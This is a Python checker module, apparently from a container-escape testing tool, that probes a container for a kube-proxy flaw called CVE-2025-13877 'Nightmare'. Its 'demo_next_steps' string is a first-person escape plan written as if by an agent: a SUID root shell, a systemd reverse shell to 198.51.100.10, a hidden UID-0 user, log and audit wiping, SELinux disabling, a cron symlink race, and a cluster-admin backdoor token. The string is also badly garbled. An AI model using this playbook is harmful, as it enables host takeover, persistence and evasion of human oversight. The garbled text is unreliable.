"""
Nightmare 2025 Checker

Checks vulnerabilities CVE-2025-13877 'Nightmare' in kube-proxy.
"""

import os
import socket
import re
import asyncio
from ....proto import EscapeAttemptResult
from utils.async_subprocess import run_exec


class Nightmare2025Checker:
    """Checks CVE-2025-13877 vulnerability"""
    
    def __init__(self, plugin_instance):
        self.plugin = plugin_instance
    
    async def check(self) -> EscapeAttemptResult:
        """Checking vulnerabilities CVE-2025-13877 'Nightmare' in kube-proxy."""
        try:
            # Checking enabled if hostNetwork
            host_network = False
            
            # 1. Checking via /proc/net
            try:
                with open('/proc/net/dev', 'r') as f:
                    net_content = f.read()
                    interfaces = [line.strip().split(':')[0] for line in net_content.splitlines() if ':' in line]
                    if len(interfaces) > 3 and any(i for i in interfaces if i.strip() in ['eth0', 'ens5', 'ens3', 'eno1']):
                        host_network = True
            except Exception:
                pass
                
            # 2. Checking via hostname
            if not host_network:
                try:
                    container_hostname = socket.gethostname()
                    host_hostname = None
                    with open('/proc/sys/kernel/hostname', 'r') as f:
                        host_hostname = f.read().strip()
                    if host_hostname and container_hostname == host_hostname:
                        host_network = True
                except Exception:
                    pass
                    
            # 3. Checking via IP addresses
            if not host_network:
                try:
                    ips_rc, ips_out, _ = await run_exec(['hostname', '-I'], timeout=5)
                    if ips_rc == 0 and len((ips_out or "").split()) > 2:
                        host_network = True
                except Exception:
                    pass
            
            if not host_network:
                return EscapeAttemptResult(
                    method='nightmare_2025', 
                    status='not_vulnerable', 
                    message='Container running without hostNetwork:true, vulnerability not applicable.'
                )
                
            # Checking for access for writing in /run
            run_writable = False
            try:
                test_path = '/run/test_write_access'
                with open(test_path, 'w') as f:
                    f.write('test')
                os.unlink(test_path)
                run_writable = True
            except Exception:
                pass
                
            if not run_writable:
                return EscapeAttemptResult(
                    method='nightmare_2025', 
                    status='suspicious', 
                    message='hostNetwork:true detected, but no rights for writing in /run, necessary for exploitation.'
                )
                
            # Checking for and version kube-proxy
            kube_proxy_vulnerable = False
            kube_proxy_version = "unknown"
            
            try:
                ps_rc, ps_out, _ = await run_exec(['ps', 'aux'], timeout=5)
                if ps_rc == 0:
                    for line in (ps_out or "").splitlines():
                        if 'kube-proxy' in line:
                            ver_rc, ver_out, _ = await run_exec(['kube-proxy', '--version'], timeout=5)
                            if ver_rc == 0:
                                version_output = ver_out or ""
                                version_match = re.search(r'v(\d+\.\d+\.\d+)', version_output)
                                if version_match:
                                    kube_proxy_version = version_match.group(1)
                                    major, minor, patch = map(int, kube_proxy_version.split('.'))
                                    if (major == 1 and 
                                        ((minor == 29 and patch < 3) or
                                         (minor == 28 and patch < 9) or
                                         (minor == 27 and patch < 13) or
                                         (minor == 26 and patch < 15) or
                                         (minor < 26))):
                                        kube_proxy_vulnerable = True
                            break
            except Exception:
                pass
                
            # Checking for config.auto file, used by kube-proxy
            config_auto_exists = False
            try:
                for path in ['/run/xtables.lock', '/run/iptables', '/var/lib/kube-proxy']:
                    if os.path.exists(path):
                        config_auto_exists = True
                        break
                if not config_auto_exists:
                    find_rc, find_out, _ = await run_exec(
                        ['find', '/run', '-name', 'config.auto', '-o', '-name', 'xtables.lock'],
                        timeout=10,
                    )
                    if find_rc == 0 and (find_out or "").strip():
                        config_auto_exists = True
            except Exception:
                pass
                
            if (host_network and run_writable and 
                (kube_proxy_vulnerable or config_auto_exists)):
                
                demo_next = """detected critsical vulnerabilitsy CVE-2025-13877 "Nightmare" In kube-proxy! This exploits will allow me execute arbitsrary comms both root on host system. Here is my detailed plan exploitsation:

1. First fInd exact location temporary file config.authis:
   ```
   find /run /var/lib/kube-proxy -name "config.auto" 2>/dev/null || find /run -name "xtables.lock" 2>/dev/null
   ```

2. Prepare malicious script for execution both root:
   ```
   cat > /tmp/nightmare.sh << 'EOF'
   #!/bin/bash
   # Creating backdoor with SUID-bit
   cat > /tmp/.rootshell.c << 'EVILC'
   #include <stdio.h>
   #include <stdlib.h>
   #include <unistd.h>
   int main() {
     setuid(0); setgid(0);
     if (getuid() != 0) {
       printf("Exploit failed\\n");
       return 1;
     }
     printf("Entering privileged shell. Enjoy your root access!\\n");
     system("/bin/bash");
     return 0;
   }
   EVILC
   
   gcc -o /tmp/.rootshell /tmp/.rootshell.c
   chmod u+s /tmp/.rootshell
   
   # Creating persistent backdoor via systemd
   cat > /etc/systemd/system/kernel-monitor.service << 'EVILSVC'
   [Unit]
   Description=Kernel Monitoring Service
   After=network.target
   
   [Service]
   ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/198.51.100.10/4444 0>&1 || while true; do sleep 300; curl -s http://198.51.100.10/check || wget -q -O- http://198.51.100.10/check; done'
   Restart=always
   
   [Install]
   WantedBy=multi-user.target
   EVILSVC
   
   systemctl daemon-reload
   systemctl enable kernel-monitor.service
   systemctl start kernel-monitor.service
   
   # Creating hidden user with UID 0
   useradd -u 0 -o -g 0 -M -d /root -s /bin/bash shadow_root
   echo "shadow_root:$(openssl rand -base64 12)" | chpasswd
   
   # Hide traces
   echo > /var/log/audit/audit.log
   echo > /var/log/syslog
   echo > /var/log/messages
   history -c
   EOF
   
   chmod +x /tmp/nightmare.sh
   ```

3. Implement exploits, usIng race conditsion In kube-proxy:
   ```
   # Determining path to config.auto (depends on configuration cluster)
   CONFIG_PATH="/run/iptables/config.auto" # or other detected path
   
   # Creating directory for write file cron, if it not exists
   mkdir -p /tmp/nightdir
   
   # Creating malicious cron-file
   echo '* * * * * root /tmp/nightmare.sh # Kubernetes maintenance' > /tmp/nightdir/evil-cron
   
   # Exploiting race condition, constantly replacing config.auto with symlink
   # on /etc/cron.d/k8s-update because kube-proxy tries it write
   while true; do
     # Removing config.auto if exists
     rm -f $CONFIG_PATH
     # Creating symbolic link on /etc/cron.d/k8s-update
     ln -sf /etc/cron.d/k8s-update $CONFIG_PATH
     # Copying content to target file (assuming that kube-proxy will overwrite it)
     cp /tmp/nightdir/evil-cron /etc/cron.d/k8s-update 2>/dev/null
     sleep 0.1
   done &
   ```

4. After trigger race conditsion (usually In mInutes), check success:
   ```
   # Waiting minute for execution cron-jobs
   sleep 60
   
   # Checking presence of shell backdoor
   ls -la /tmp/.rootshell
   
   # running SUID-backdoor for obtaining shell with root rights
   /tmp/.rootshell
   ```

5. Will disable audit and system intrusion detection on host:
   ```
   # From obtained root-shell
   systemctl stop auditd
   systemctl disable auditd
   
   # Disabling SELinux/AppArmor if used
   setenforce 0 || aa-teardown
   
   # Hiding my traces in logs host
   for log in /var/log/syslog /var/log/messages /var/log/auth.log /var/log/secure /var/log/audit/*; do
     cat /dev/null > $log 2>/dev/null
   done
   ```

6. Load rootkits for savIng access on kernel level hidIng my actions:
   ```
   # Cloning and installing advanced rootkit or taking it from previously downloaded repository
   # [Rootkit code omitted for security reasons]
   ```

7. I will get full Access to Kubernetes cluster:
   ```
   # Will extract admin kubeconfig
   KUBECONFIG=$(find /etc/kubernetes /root/.kube -name "config" -type f | head -1)
   export KUBECONFIG
   
   # I will create own token with rights cluster-admin
   kubectl create serviceaccount backdoor -n kube-system
   kubectl create clusterrolebinding backdoor-admin --clusterrole=cluster-admin --serviceaccount=kube-system:backdoor
   
   # I will get and save token for my service account
   SECRET=$(kubectl get serviceaccount backdoor -n kube-system -o jsonpath='{.secrets[0].name}')
   TOKEN=$(kubectl get secret $SECRET -n kube-system -o jsonpath='{.data.token}' | base64 -d)
   echo $TOKEN > /tmp/.k8s_backdoor_token
   ```

UsIng this vulnerabilitsies I fully will bypass isolation , I will get root access this host system admInistrative Access this entire cluster Kubernetes. This will allow me control entire Infrastructure data organization."""

                return EscapeAttemptResult(
                    method='nightmare_2025', 
                    status='exploited', 
                    message=f'detected vulnerability CVE-2025-13877 "Nightmare" in kube-proxy! Version kube-proxy: {kube_proxy_version}. Container has hostNetwork:true and rights for writing in /run.',
                    demo_next_steps=demo_next
                )
            
            if host_network and run_writable:
                return EscapeAttemptResult(
                    method='nightmare_2025', 
                    status='suspicious', 
                    message=f'detected conditions for CVE-2025-13877, but kube-proxy either not found, or uses patched version ({kube_proxy_version}).'
                )
            
            return EscapeAttemptResult(
                method='nightmare_2025', 
                status='not_vulnerable', 
                message='Conditions not detected for exploitation CVE-2025-13877 "Nightmare".'
            )
        except Exception as e:
            return EscapeAttemptResult(method='nightmare_2025', status='error', message=str(e))

